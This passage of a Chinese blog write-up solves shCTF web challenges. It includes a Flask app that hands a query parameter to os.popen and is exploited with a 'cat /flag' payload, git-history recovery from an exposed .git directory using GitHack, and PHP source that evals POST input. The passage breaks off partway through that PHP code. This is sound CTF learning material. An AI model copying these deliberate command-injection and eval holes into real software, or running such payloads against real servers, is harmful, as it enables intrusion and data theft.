<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="kinsey"><meta name="copyright" content="kinsey"><meta name="generator" content="Hexo 7.2.0"><meta name="theme" content="hexo-theme-yun"><title>shCTF | 北歌</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="stylesheet" type="text/css" href="https://fastly.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/katex.min.js"></script><link rel="stylesheet" type="text/css" href="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.css"><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/auto-render.min.js"></script><script type="module">import { renderKatex } from '/js/utils.js'
document.addEventListener("DOMContentLoaded", () => {
  renderKatex({
    ...{},
    ...undefined?.options,
  });
});</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"kinseyy.github.io","root":"/","title":"北沐城歌","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"algolia":{"appID":"LWKPDLFKV6","apiKey":"6f230e5e2cdf36415bd02b48c1138c08","indexName":"my-hexo-blog","hits":{"per_page":8}},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://kinsey-six.vercel.app","comment":true,"visitor":true,"emoji":["https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/bilibili/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/weibo/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/qq/"],"locale":{"placeholder":"填写邮箱，可以收到回复通知哦～"},"requiredMeta":["nick"],"el":"#waline","lang":"en"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="北歌" type="application/atom+xml"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-1LL0D86CY9');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"S8MhECl1Bg6fZt5ulKgIlajS-MdYXbMMI","app_key":"eLIsYKPJFnSJdwmHLoigqBR4","server_url":"https://s8mhecl1.api.lncldglobal.com"}</script><script defer src="/js/analytics/leancloud-visitors.js" type="module"></script><meta name="description" content="WEB[Week1] 1zflask题目提示robots  那我们访问&#x2F;robots.txt，得到一个新的文件，我们访问，自动下载了一个py文件 1234567891011121314151617181920212223import osimport flaskfrom flask import Flask, request, send_from_directory, send_file">
<meta property="og:type" content="article">
<meta property="og:title" content="shCTF">
<meta property="og:url" content="https://kinseyy.github.io/2024/10/05/shCTF/index.html">
<meta property="og:site_name" content="北歌">
<meta property="og:description" content="WEB[Week1] 1zflask题目提示robots  那我们访问&#x2F;robots.txt，得到一个新的文件，我们访问，自动下载了一个py文件 1234567891011121314151617181920212223import osimport flaskfrom flask import Flask, request, send_from_directory, send_file">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051148888.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051548372.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051549207.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062001138.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062001115.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062049670.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062051642.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062052889.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062054069.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062113443.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062113507.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242055752.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242056773.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241908643.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241908783.png">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/7qW6h4Sfy6DXkO0QiaOzfHZg049wIQHicnMiaQLianWsb9jbTHXy0xsJjohqzl3dxT8xXZd00Fs4KQypQ0yWtJUt9Q/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=10005&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241934303.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241939435.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242020742.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242020845.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242022040.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242043580.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252033701.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252051517.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252054205.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252113737.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252126834.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252122634.png">
<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/87a906a53cfcc4947e39a76883a63591.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252128569.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252135483.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252142777.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271448305.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271528055.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271647524.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271648116.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271651197.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271654740.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271654308.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410312017171.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410312026817.png">
<meta property="article:published_time" content="2024-10-05T03:47:01.000Z">
<meta property="article:modified_time" content="2024-10-31T12:30:53.690Z">
<meta property="article:author" content="kinsey">
<meta property="article:tag" content="复现">
<meta property="article:tag" content="hash强碰撞">
<meta property="article:tag" content="hash长度扩展攻击">
<meta property="article:tag" content="二次渲染">
<meta property="article:tag" content="pickle反序列化">
<meta property="article:tag" content="YzmCMS v7.0漏洞">
<meta property="article:tag" content="git源码泄露">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051148888.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="kinsey"><img width="96" loading="lazy" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405312004243.jpeg" alt="kinsey"><span class="site-author-status" title="Looking for dawn.">🌑</span></a><div class="site-author-name"><a href="/about/">kinsey</a></div><span class="site-name">北歌</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">220</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">101</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/kinseyy" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=3954596483" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://travellings.link" title="Travelling" target="_blank" style="color:var(--hty-text-color)"><span class="icon iconify" data-icon="ri:train-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-1zflask"><span class="toc-number">1.1.</span> <span class="toc-text">[Week1] 1zflask</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-ez-gittt"><span class="toc-number">1.2.</span> <span class="toc-text">[Week1] ez_gittt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-%E5%8D%95%E8%BA%AB%E5%8D%81%E5%85%AB%E5%B9%B4%E7%9A%84%E6%89%8B%E9%80%9F"><span class="toc-number">1.3.</span> <span class="toc-text">[Week1] 单身十八年的手速</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-%E8%9B%90%E8%9B%90-%E8%9B%90%E8%9B%90"><span class="toc-number">1.4.</span> <span class="toc-text">[Week1] 蛐蛐?蛐蛐!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-poppopop"><span class="toc-number">1.5.</span> <span class="toc-text">[Week1] poppopop</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-MD5-Master"><span class="toc-number">1.6.</span> <span class="toc-text">[Week1] MD5 Master</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week2-%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81"><span class="toc-number">1.7.</span> <span class="toc-text">[Week2]登录验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week2-dickle"><span class="toc-number">1.8.</span> <span class="toc-text">[Week2]dickle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week2-%E8%87%AA%E5%8A%A9%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.9.</span> <span class="toc-text">[Week2]自助查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week2-MD5-GOD"><span class="toc-number">1.10.</span> <span class="toc-text">[Week2]MD5 GOD!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week3-%E5%B0%8F%E5%B0%8Fcms"><span class="toc-number">1.11.</span> <span class="toc-text">[Week3] 小小cms</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.11.1.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week3-%E6%8B%9C%E5%B8%88%E4%B9%8B%E6%97%85%C2%B7%E7%95%AA%E5%A4%96"><span class="toc-number">1.12.</span> <span class="toc-text">[Week3] 拜师之旅·番外</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week3-love-flask"><span class="toc-number">1.13.</span> <span class="toc-text">[Week3] love_flask</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.13.1.</span> <span class="toc-text">第二种方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week3-hacked-website"><span class="toc-number">1.14.</span> <span class="toc-text">[Week3] hacked_website</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="toc-number">1.14.1.</span> <span class="toc-text">解法二</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week3-%E9%A1%B0"><span class="toc-number">1.15.</span> <span class="toc-text">[Week3] 顰</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRYPTO"><span class="toc-number">2.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-EzAES"><span class="toc-number">2.1.</span> <span class="toc-text">[Week1] EzAES</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-baby-mod"><span class="toc-number">2.2.</span> <span class="toc-text">[Week1] baby_mod</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Week1-d-known"><span class="toc-number">2.3.</span> <span class="toc-text">[Week1] d_known</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://kinseyy.github.io/2024/10/05/shCTF/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="kinsey"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="北歌"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">shCTF<a class="post-edit-link" href="https://github.com/kinseyy/kinseyy.github.io/tree/master/2024/05/31/hello-world_posts/shCTF.md" target="_blank" title="Edit this post" rel="noopener"><span class="icon iconify" data-icon="ri:edit-line"></span></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2024-10-05 11:47:01" itemprop="dateCreated datePublished" datetime="2024-10-05T11:47:01+08:00">2024-10-05</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2024-10-31 20:30:53" itemprop="dateModified" datetime="2024-10-31T20:30:53+08:00">2024-10-31</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">6.4k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">31m</span></span></span><span class="leancloud_visitors" id="/2024/10/05/shCTF/" data-flag-title="shCTF"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><span class="icon iconify" data-icon="ri:eye-line"></span> <span class="leancloud-visitors-count"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="Comments"><span class="icon iconify" data-icon="ri:chat-3-line"></span> <span class="waline-comment-count" id="/2024/10/05/shCTF/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">比赛复现</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E5%A4%8D%E7%8E%B0/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">复现</span></a><a class="tag-item" href="/tags/hash%E5%BC%BA%E7%A2%B0%E6%92%9E/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">hash强碰撞</span></a><a class="tag-item" href="/tags/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">hash长度扩展攻击</span></a><a class="tag-item" href="/tags/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">二次渲染</span></a><a class="tag-item" href="/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">pickle反序列化</span></a><a class="tag-item" href="/tags/YzmCMS-v7-0%E6%BC%8F%E6%B4%9E/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">YzmCMS v7.0漏洞</span></a><a class="tag-item" href="/tags/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">git源码泄露</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="Week1-1zflask"><a href="#Week1-1zflask" class="headerlink" title="[Week1] 1zflask"></a>[Week1] 1zflask</h4><p>题目提示robots</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051148888.png" alt="image-20241005114757812" loading="lazy"></p>
<p>那我们访问&#x2F;robots.txt，得到一个新的文件，我们访问，自动下载了一个py文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import flask</span><br><span class="line">from flask import Flask, request, send_from_directory, send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/api&#x27;)</span><br><span class="line">def api():</span><br><span class="line">    cmd = request.args.get(&#x27;SSHCTFF&#x27;, &#x27;ls /&#x27;)</span><br><span class="line">    result = os.popen(cmd).read()</span><br><span class="line">    return result</span><br><span class="line">    </span><br><span class="line">@app.route(&#x27;/robots.txt&#x27;)</span><br><span class="line">def static_from_root():</span><br><span class="line">    return send_from_directory(app.static_folder,&#x27;robots.txt&#x27;)</span><br><span class="line">    </span><br><span class="line">@app.route(&#x27;/s3recttt&#x27;)</span><br><span class="line">def get_source():</span><br><span class="line">    file_path = &quot;app.py&quot;</span><br><span class="line">    return send_file(file_path, as_attachment=True)</span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>

<p>我们发现，在api路由里传了一个参数，且默认为ls &#x2F;，我们访问在这个路由</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051548372.png" alt="image-20241005154858274" loading="lazy"></p>
<p>我们发现flag所在位置，修改SSHCTFF为cat &#x2F;flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?SSHCTFF=cat /flag</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051549207.png" alt="image-20241005154942179" loading="lazy"></p>
<h4 id="Week1-ez-gittt"><a href="#Week1-ez-gittt" class="headerlink" title="[Week1] ez_gittt"></a>[Week1] ez_gittt</h4><p>我们在网页源码里发现提示</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062001138.png" alt="image-20241006200120091" loading="lazy"></p>
<p>想到了git泄露，我们访问.git</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062001115.png" alt="image-20241006200149024" loading="lazy"></p>
<p>进入文件夹</p>
<p>我们在&#x2F;logs&#x2F;refs&#x2F;heads&#x2F;master里发现修改日志</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062049670.png" alt="image-20241006204926591" loading="lazy"></p>
<p>我们发现他添加了flag，又删除了flag，那我们可以回滚日志，就能找到flag了，我们先用githack把仓库克隆下来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2  GitHack.py http://entry.shc.tf:30187/.git/  </span><br></pre></td></tr></table></figure>

<p>克隆后在文件中查询日志</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>

<p>然后回滚日志</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff 73beab9e53f96cb5d610ee2e95da714844f4cbb3</span><br></pre></td></tr></table></figure>

<p>找到flag</p>
<h4 id="Week1-单身十八年的手速"><a href="#Week1-单身十八年的手速" class="headerlink" title="[Week1] 单身十八年的手速"></a>[Week1] 单身十八年的手速</h4><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062051642.png" alt="image-20241006205113566" loading="lazy"></p>
<p>我们打开页面发现要求点击520次就可获得flag，一看又是个js的题，但我们在game.js直接就找到了flag的base64编码，解码得到flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062052889.png" alt="image-20241006205214814" loading="lazy"></p>
<h4 id="Week1-蛐蛐-蛐蛐"><a href="#Week1-蛐蛐-蛐蛐" class="headerlink" title="[Week1] 蛐蛐?蛐蛐!"></a>[Week1] 蛐蛐?蛐蛐!</h4><p>我们打开源代码，发现有个提示</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062054069.png" alt="image-20241006205440029" loading="lazy"></p>
<p>我们访问source.txt，发现一串代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_GET[&#x27;ququ&#x27;] == 114514 &amp;&amp; strrev($_GET[&#x27;ququ&#x27;]) != 415411)&#123;</span><br><span class="line">    if($_POST[&#x27;ququ&#x27;]!=null)&#123;</span><br><span class="line">        $eval_param = $_POST[&#x27;ququ&#x27;];</span><br><span class="line">        if(strncmp($eval_param,&#x27;ququk1&#x27;,6)===0)&#123;</span><br><span class="line">            eval($_POST[&#x27;ququ&#x27;]);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo(&quot;可以让fault的蛐蛐变成现实么\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo(&quot;蛐蛐成功第一步！\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span 